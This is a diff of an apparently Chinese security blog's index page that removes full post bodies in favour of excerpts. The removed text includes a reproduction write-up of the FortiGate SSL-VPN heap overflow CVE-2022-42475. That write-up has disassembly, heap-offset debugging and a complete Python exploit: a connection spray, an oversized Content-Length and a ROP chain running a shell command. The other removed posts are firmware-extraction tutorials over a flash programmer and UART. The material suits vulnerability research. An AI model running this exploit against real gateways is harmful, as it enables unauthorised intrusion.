@@ -188,7 +188,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-12-18 22:50:02" itemprop="dateModified" datetime="2023-12-18T22:50:02+08:00">2023-12-18</time>
+                <time title="Modified: 2024-12-09 21:34:20" itemprop="dateModified" datetime="2024-12-09T21:34:20+08:00">2024-12-09</time>
               </span>
 
           
@@ -202,30 +202,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前就想复现这个洞，不过因为环境的问题迟迟没有开工。巧在前一阵子有个师傅来找我讨论劫持<strong>ssl结构体</strong>中函数指针时如何确定堆溢出的偏移，同时还他把搭建好了的环境发给了我，因此才有了此文。</p>
-<h3 id="如何劫持SSL结构体指针实现控制程序流"><a href="#如何劫持SSL结构体指针实现控制程序流" class="headerlink" title="如何劫持SSL结构体指针实现控制程序流"></a>如何劫持SSL结构体指针实现控制程序流</h3><p>就我个人理解而言，我觉得劫持的这个函数指针类似于我们常见的 __malloc_hook，__free_hook。它本身的值为空，当他不为空时，便会调用这个函数指针。如果我们把这个函数指针劫持为合适的<strong>gadget</strong>便可以控制程序的执行流。相关代码如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">debug_2nd_control</span><span class="params">(__int64 a1, <span class="type">char</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v8 + <span class="number">96</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v9 != v8 + <span class="number">96</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = *(__int64 (__fastcall **)(__int64))(v9 + <span class="number">192</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v10 )</span><br><span class="line">            <span class="keyword">return</span> v10(a1);</span><br><span class="line">          ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.text:<span class="number">000000000180</span>C180 <span class="number">48</span> <span class="number">8B</span> <span class="number">82</span> C0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                    mov     rax, [rdx+<span class="number">0</span>C0h]</span><br><span class="line">.text:<span class="number">000000000180</span>C187 <span class="number">4</span>C <span class="number">89</span> EF                                mov     rdi, r13</span><br><span class="line">.text:<span class="number">000000000180</span>C18A <span class="number">48</span> <span class="number">85</span> C0                                test    rax, rax</span><br><span class="line">.text:<span class="number">000000000180</span>C18D <span class="number">0F</span> <span class="number">84</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                       jz      loc_180C218</span><br><span class="line">.text:<span class="number">000000000180</span>C193 <span class="number">5B</span>                                      pop     rbx</span><br><span class="line">.text:<span class="number">000000000180</span>C194 <span class="number">41</span> <span class="number">5</span>C                                   pop     r12</span><br><span class="line">.text:<span class="number">000000000180</span>C196 <span class="number">41</span> <span class="number">5</span>D                                   pop     r13</span><br><span class="line">.text:<span class="number">000000000180</span>C198 <span class="number">41</span> <span class="number">5</span>E                                   pop     r14</span><br><span class="line">.text:<span class="number">000000000180</span>C19A <span class="number">5</span>D                                      pop     rbp</span><br><span class="line">.text:<span class="number">000000000180</span>C19B FF E0                                   jmp     rax</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>从下面的汇编中可知，这里分配的大小是由<strong>movsxd  rsi, esi</strong>，直接从4字节扩展为了8字节，如果我们把大小控制为<strong>0x1b00000000</strong>，这样就会导致分配并初始化的大小为<strong>1</strong>，从而产生堆溢出。利用手法是，在堆上大量喷射<strong>SSL</strong>结构体，从而劫持其中对应的函数指针。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0000000001811174 8B 40 18        mov     eax, [rax+18h]  ; Keypatch modified this from:</span><br><span class="line">0000000001811174                 ;   nop word ptr [rax+rax+00000000h]</span><br><span class="line">0000000001811174                 ; Keypatch padded NOP to next boundary: 8 bytes</span><br><span class="line">0000000001811177 49 8B 3C 24     mov     rdi, [r12]      ; Keypatch modified this from:</span><br><span class="line">000000000181117B E9 86 02 00 00  jmp     loc_1811406</span><br><span class="line"></span><br><span class="line">0000000001811406 8D 70 01        lea     esi, [rax+1]    ; Keypatch modified this from:</span><br><span class="line">0000000001811409 E9 96 01 00 00  jmp     loc_18115A4</span><br><span class="line"></span><br><span class="line">00000000018115A4 48 63 F6        movsxd  rsi, esi        ; Keypatch modified this from:</span><br><span class="line">00000000018115A7 E9 88 FB FF FF  jmp     loc_1811134</span><br><span class="line"></span><br><span class="line">0000000001811134 E8 27 0A EC FF  call    alloc__</span><br></pre></td></tr></table></figure>
-
-<h3 id="如何确定填充数量"><a href="#如何确定填充数量" class="headerlink" title="如何确定填充数量"></a>如何确定填充数量</h3><p>网上已经有文章 (<a target="_blank" rel="noopener" href="https://forum.butian.net/index.php/share/2166">https://forum.butian.net/index.php/share/2166</a>) 给出了一个可劫持到函数指针的poc。我们这里就直接用了他这种布局，重点记录一下如何找到这个填充的数量。对于这个固件而言<strong>ssl</strong>结构体初始化时，我们可以看到如下的代码。很明显可以看到，他会把字符串<strong>read_post_data</strong>拷贝到距离结构体偏移为 <strong>200</strong>的地方。而根据上面的代码可知，我们要劫持的函数指针在结构体偏移为<strong>192</strong>的地方。故我们只需定位到<strong>read_post_data</strong>，即可确定偏移。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sub_181BC20(a2, <span class="string">&quot;read_post_data&quot;</span>, <span class="number">0</span>, <span class="number">1</span>, (__int64)sslvpnd_read_post_data);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">sub_181BC20</span><span class="params">(__int64 *a1, <span class="type">const</span> <span class="type">char</span> *str, <span class="type">int</span> a3, <span class="type">int</span> a4, __int64 a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  strLen = <span class="built_in">strlen</span>(str);</span><br><span class="line">  v8 = alloc__(*a1, strLen + <span class="number">201</span>);</span><br><span class="line">  v9 = (__int64)v8;</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)v8 = v8;</span><br><span class="line">    *((_QWORD *)v8 + <span class="number">1</span>) = v8;</span><br><span class="line">    v10 = &amp;v8[<span class="number">32</span> * a3];</span><br><span class="line">    *((_DWORD *)v10 + <span class="number">6</span>) = a4;</span><br><span class="line">    *((_DWORD *)v10 + <span class="number">7</span>) = a4;</span><br><span class="line">    <span class="keyword">if</span> ( (a4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)(<span class="number">32LL</span> * a3 + v9 + <span class="number">32</span>) = a5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (a4 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)(<span class="number">32LL</span> * a3 + v9 + <span class="number">40</span>) = a5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *)(v9 + <span class="number">200</span>), str);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>调试时内存分布如下，有<strong>0x2638-0x1818 &#x3D; 0xE20 &#x3D; 3616</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(gdb) i r $rdi</span><br><span class="line">rdi            0x7f6edef01818   140114163406872</span><br><span class="line">(gdb) x/10gx 0x7f6edef01818</span><br><span class="line">0x7f6edef01818: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f6edef01828: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f6edef01838: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f6edef01848: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f6edef01858: 0x0000000000000000      0x0000000000000000</span><br><span class="line">(gdb) x/10gx 0x7f6edef02638</span><br><span class="line">0x7f6edef02638: 0x0000000000000000      0x736f705f64616572</span><br><span class="line">0x7f6edef02648: 0x0000617461645f74      0x0000000000000000</span><br><span class="line">0x7f6edef02658: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f6edef02668: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f6edef02678: 0x0000000000000000      0x0000000000000000</span><br><span class="line">(gdb) x/s 0x7f6edef02640</span><br><span class="line">0x7f6edef02640: &quot;read_post_data&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"></span><br><span class="line">p64 = <span class="keyword">lambda</span> x: struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, x)</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;/remote/login&quot;</span>.encode()</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.229.162&quot;</span></span><br><span class="line">port = <span class="number">4443</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_ssl_ctx</span>():</span><br><span class="line">    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    _socket.connect((ip, port))</span><br><span class="line">    _default_context = ssl._create_unverified_context()</span><br><span class="line">    _socket = _default_context.wrap_socket(_socket)</span><br><span class="line">    <span class="keyword">return</span> _socket</span><br><span class="line"></span><br><span class="line">socks = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">    sk = create_ssl_ctx()</span><br><span class="line">    data = <span class="string">b&quot;POST &quot;</span> + path + <span class="string">b&quot; HTTP/1.1\r\nHost: 192.168.229.146\r\nContent-Length: 100\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&quot;</span></span><br><span class="line">    sk.sendall(data)</span><br><span class="line">    socks.append(sk)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>, <span class="number">40</span>, <span class="number">2</span>):</span><br><span class="line">    sk = socks[i]</span><br><span class="line">    sk.close()</span><br><span class="line">    socks[i] = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">CL = <span class="string">&quot;115964116992&quot;</span></span><br><span class="line">data = <span class="string">b&quot;POST &quot;</span> + path + <span class="string">b&quot; HTTP/1.1\r\nHost: 192.168.229.146\r\nContent-Length: &quot;</span> + CL.encode() + <span class="string">b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\nf=1&quot;</span></span><br><span class="line"></span><br><span class="line">exp_sk = create_ssl_ctx()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    sk = create_ssl_ctx()</span><br><span class="line">    socks.append(sk)</span><br><span class="line"></span><br><span class="line">exp_sk.sendall(data)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;b&quot;</span> * (<span class="number">3613</span>-<span class="number">0xc0</span>)</span><br><span class="line">payload+= p64(<span class="number">0</span>)</span><br><span class="line">payload+= p64(<span class="number">0x19de70a</span>)</span><br><span class="line"><span class="comment"># 0x00000000019de70a : pop r12 ; pop r13 ; pop rbp ; ret</span></span><br><span class="line">payload+= p64(<span class="number">0x100</span>)*<span class="number">3</span></span><br><span class="line">payload+= p64(<span class="number">0x1855c29</span>)</span><br><span class="line"><span class="comment"># 0x0000000001855c29 : add rdx, r8 ; mov byte ptr [rdx], 0 ; ret</span></span><br><span class="line">payload+= p64(<span class="number">0x1fe54ad</span>)</span><br><span class="line"><span class="comment"># 0x0000000001fe54ad : pop rbp ; mov rax, rdx ; ret</span></span><br><span class="line">payload+= p64(<span class="number">0x30</span>)</span><br><span class="line">payload+= p64(<span class="number">0x18cfb70</span>)</span><br><span class="line"><span class="comment"># 0x00000000018cfb70 : lea rdi, [rax - 0x28] ; call qword ptr [rax + 0x30]</span></span><br><span class="line">payload+= p64(<span class="number">0x40</span>)*(<span class="number">24</span>-<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">payload+= p64(<span class="number">0x1d3379c</span>) <span class="comment"># rip</span></span><br><span class="line"><span class="comment"># push rdx ; adc byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret</span></span><br><span class="line">payload+= p64(<span class="number">0x736f705f64616572</span>)</span><br><span class="line">payload+= p64(<span class="number">0x0000617461645f74</span>)</span><br><span class="line">cmd = <span class="string">b&quot;busybox ls &gt; /tmp/hack&quot;</span></span><br><span class="line">cmd = cmd.ljust(<span class="number">11</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+= cmd</span><br><span class="line">payload+= p64(<span class="number">0x43FDF0</span>)</span><br><span class="line"></span><br><span class="line">exp_sk.sendall(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sk <span class="keyword">in</span> socks:</span><br><span class="line">    <span class="keyword">if</span> sk:</span><br><span class="line">        data = <span class="string">b&quot;b&quot;</span> * <span class="number">40</span></span><br><span class="line">        sk.sendall(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;done&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://forum.butian.net/index.php/share/2166">https://forum.butian.net/index.php/share/2166</a></p>
-<p><a target="_blank" rel="noopener" href="https://bestwing.me/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html">https://bestwing.me/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://wzt.ac.cn/2022/12/15/CVE-2022-42475/">https://wzt.ac.cn/2022/12/15/CVE-2022-42475/</a></p>
-<p><a target="_blank" rel="noopener" href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/">https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/</a></p>
-
+          <p>Fortigate 堆溢出利用思路及手法学习</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/11/06/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow/">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -275,7 +260,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-12-02 23:36:15" itemprop="dateModified" datetime="2023-12-02T23:36:15+08:00">2023-12-02</time>
+                <time title="Modified: 2024-12-09 21:38:04" itemprop="dateModified" datetime="2024-12-09T21:38:04+08:00">2024-12-09</time>
               </span>
 
           
@@ -289,29 +274,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>自写完 **<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/16926238.html">从路由器真机提取固件包（一）</a>**介绍如何通过 <strong>UART</strong>提取固件之后，一直没时间来写如何通过编程器提取固件。正好最近在看一款设备的时候，发现无法从官网下载到他的固件包，也无法通过串口拿到他的 shell，只能通过编程器提取他的固件。于是想起这篇算是鸽了很久的文章，现在来补写一下。</p>
-<h3 id="所用到的工具及设备"><a href="#所用到的工具及设备" class="headerlink" title="所用到的工具及设备"></a>所用到的工具及设备</h3><ul>
-<li>CH341A编程器</li>
-<li>转接板</li>
-<li>芯片夹</li>
-<li>xxx 路由器</li>
-<li>热风枪（x</li>
-</ul>
-<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="ROM芯片"><a href="#ROM芯片" class="headerlink" title="ROM芯片"></a>ROM芯片</h4><p>固件一般存储在ROM中，ROM是只读存储器（Read-Only Memory）的简称，是一种只能读出事先所存数据的固态半导体存储器。其特性是一旦储存资料就无法再将之改变或删除。通常用在不需经常变更资料的电子或电脑系统中，并且资料不会因为电源关闭而消失。</p>
-<h4 id="编程器"><a href="#编程器" class="headerlink" title="编程器"></a>编程器</h4><p>读取Flash芯片，需要借助编程器，编程器又称烧录器、写入器、写码器，是专门用来对IC芯片进行读写、编程&#x2F;烧录的仪器。本文会用 <strong>CH341A编程器</strong>读取此设备的固件。</p>
-<h4 id="编程器读取方式"><a href="#编程器读取方式" class="headerlink" title="编程器读取方式"></a>编程器读取方式</h4><p>（1）直接将导线连接到芯片的引脚，在通过导线连接编程器读取固件；<br>（2）把芯片拆下来，再连接编程器读取固件。</p>
-<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><h4 id="找到flash并确定1号引脚"><a href="#找到flash并确定1号引脚" class="headerlink" title="找到flash并确定1号引脚"></a>找到flash并确定1号引脚</h4><p>值得一提的是，有些flash不在开发板正面，因此可稍作留意。例如上面两幅图中样机的flash便是在PCB背面。1号引脚附近应该会有小标记，如图这个便是有一个小三角指向1号引脚，及偏右下角的那个引脚。</p>
-<p><img src="/img/%E4%BB%8E%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9C%9F%E6%9C%BA%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89/1.png"></p>
-<p><img src="/img/%E4%BB%8E%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9C%9F%E6%9C%BA%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89/2.png"></p>
-<h4 id="组装芯片夹、转接板与编程器"><a href="#组装芯片夹、转接板与编程器" class="headerlink" title="组装芯片夹、转接板与编程器"></a>组装芯片夹、转接板与编程器</h4><p>我这里用的是 <strong>SOP8</strong>的芯片夹。与转接板连接时，红色的线对准1号位置。再按图中位置固定到编程器上。</p>
-<p><img src="/img/%E4%BB%8E%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9C%9F%E6%9C%BA%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89/3.png"></p>
-<h4 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h4><p>最后把编程器插到电脑上，芯片夹夹住 <strong>flash</strong>即可（红线对准有标记的部分）。此时如果设备的电源灯亮，即说明已经正确连接。此时打开 <strong>CH341A</strong>编程器相对应的软件自动识别并提取固件即可，如果无法自动识别则可以通过 <strong>flash</strong>上印着的型号手动确定芯片类型即可。</p>
-<p><img src="/img/%E4%BB%8E%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9C%9F%E6%9C%BA%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89/4.png"></p>
-<p><img src="/img/%E4%BB%8E%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9C%9F%E6%9C%BA%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89/5.png"></p>
-<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/33527131">https://zhuanlan.zhihu.com/p/33527131</a></p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzUzNDYxOTA1NA==&mid=2247491223&idx=4&sn=39016ad70598e64c0a74b4bf08d223c9&chksm=fa90a856cde7214079b273bba8997e9c4cbabfde2fc1ff287fd6dd0d175223b3954fe37f9a88&scene=27">https://mp.weixin.qq.com/s?__biz=MzUzNDYxOTA1NA==&amp;mid=2247491223&amp;idx=4&amp;sn=39016ad70598e64c0a74b4bf08d223c9&amp;chksm=fa90a856cde7214079b273bba8997e9c4cbabfde2fc1ff287fd6dd0d175223b3954fe37f9a88&amp;scene=27</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39224267/article/details/124661034">https://blog.csdn.net/weixin_39224267/article/details/124661034</a></p>
-
+          <p>自写完 从路由器真机提取固件包（一）介绍如何通过 UART提取固件之后，一直没时间来写如何通过编程器提取固件。正好最近在看一款设备的时候，发现无法从官网下载到他的固件包，也无法通过串口拿到他的 shell，只能通过编程器提取他的固件。于是想起这篇算是鸽了很久的文章，现在来补写一下。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/11/06/%E4%BB%8E%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9C%9F%E6%9C%BA%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89/">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -361,7 +332,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-12-02 23:36:21" itemprop="dateModified" datetime="2023-12-02T23:36:21+08:00">2023-12-02</time>
+                <time title="Modified: 2024-12-09 21:38:18" itemprop="dateModified" datetime="2024-12-09T21:38:18+08:00">2024-12-09</time>
               </span>
 
           
@@ -375,42 +346,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看<code>IOT</code>也有一段时间了，但是一直都是从官网获取固件包，没有尝试过从真机里提取固件。在看了一些师傅的文章后决定尝试一下从真机中提取固件。正好手里也有几个路由器，于是用刚到手的奖学金去买了提取固件所需要的工具用来学习一下如何通过串口调试获取固件。</p>
-<h3 id="所用到的工具及设备"><a href="#所用到的工具及设备" class="headerlink" title="所用到的工具及设备"></a>所用到的工具及设备</h3><ul>
-<li>FT232</li>
-<li>电烙铁</li>
-<li>杜邦线</li>
-<li>万用表</li>
-<li>xxx 路由器</li>
-<li>SecureCRT</li>
-</ul>
-<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="串口介绍"><a href="#串口介绍" class="headerlink" title="串口介绍"></a>串口介绍</h4><p>串口是一个泛称，UART、COM、TTL、RS232、RS485都遵循类似的通信时序协议，因此都被通称为串口。<br>而在嵌入式开发中所听到的串口一般指的是<code>UART</code>。<code>UART</code>使用的是异步串行通信，以字符为传输单位，一位一位的顺序输送；通信中两个字符间的时间间隔是不固定的 ，然而同一个字符内两个相邻位之间的时间间隔是固定的。数据的传送速率用波特率来表示，即每秒钟传送的二进制位数。一般选波特率都会有9600,19200,115200等，最常用的是115200。<br><code>UART</code>有四个<code>pin</code>，分别是<code>VCC,GND,RX,TX</code>，用的是<code>TTL</code>电平，低电平为<code>0V</code>，高电平为<code>3.3V-5V</code>。</p>
-<h5 id="UART-引脚介绍"><a href="#UART-引脚介绍" class="headerlink" title="UART 引脚介绍"></a>UART 引脚介绍</h5><ul>
-<li>VCC：供电pin，一般是3.3v，在我们的板子上没有过电保护，这个pin一般不接更安全(在路由器通电的时候可以不连VCC)。</li>
-<li>GND：接地pin，有的时候RX接受数据有问题，就要接上这个pin，一般也可不接。</li>
-<li>RX：接收数据pin。</li>
-<li>TX：发送数据pin。</li>
-</ul>
-<h4 id="UART-通信"><a href="#UART-通信" class="headerlink" title="UART 通信"></a>UART 通信</h4><p><code>UART</code>最好的一点是它只使用两根线就可以在设备之间传输数据。在<code>UART</code>通信中，两个<code>UART</code>直接相互通信。发送<code>UART</code>将来自<code>CPU</code>等控制设备的并行数据转换为串行形式，并将其串行发送到接收<code>UART</code>，接收<code>UART</code>然后将串行数据转换回接收设备的并行数据。在两个<code>UART</code>之间传输数据只需要两根线。数据从发送<code>UART</code>的<code>TX</code>引脚流向接收<code>UART</code>的<code>RX</code>引脚，也就是接受和发送数据的<code>UART</code>的<code>RX和TX</code>要反过来连接。</p>
-<h4 id="寻找-UART-串口，并定位-pin"><a href="#寻找-UART-串口，并定位-pin" class="headerlink" title="寻找 UART 串口，并定位 pin"></a>寻找 UART 串口，并定位 pin</h4><p>下图是笔者拆开<code>xxx 路由器</code>得到的板子，可以看到红色方框里有四个孔，这就是<code>UART</code>串口，并且这个板子很人性化已经给我们标好了引脚的名称。</p>
-<p><img src="/img/%E4%BB%8E%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9C%9F%E6%9C%BA%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%E5%8C%85%EF%BC%88%E4%B8%80%EF%BC%89/1.png"></p>
-<p>如果没给我们标注好串口的名称，我们也可以通过万用表去定位每一个引脚。</p>
-<p>1、定位 <code>GND</code></p>
-<p>将万用表调到蜂鸣档，然后将黑表笔接到背面电源焊锡点，红表笔分别触碰<code>UART</code>四个引脚的焊接点。发出声响的就是<code>GND</code>引脚。</p>
-<p>2、定位 <code>VCC</code></p>
-<p>将万用表调到直流<code>20V</code>，然后将黑表笔放到刚刚判断的<code>GND</code>引脚上，再用红表笔触碰其他三个焊接点进行测试。电压稳定在<code>3.3V或5V</code>左右的那个引脚即为<code>VCC</code>引脚。</p>
-<p>3、定位 <code>TXD</code></p>
-<p>开机会出现数据传输，如果该引脚出现了电压变化，则该引脚是<code>TXD</code>。黑表笔放到刚刚判断的<code>GND</code>引脚上，重启路由器，用红表笔触碰其他两个引脚，电压发生变化的即为<code>TDX</code>。</p>
-<p>4、定位 <code>RXD</code></p>
-<p>确定了其他三个引脚之后，剩下的一个即为<code>RDX</code>。</p>
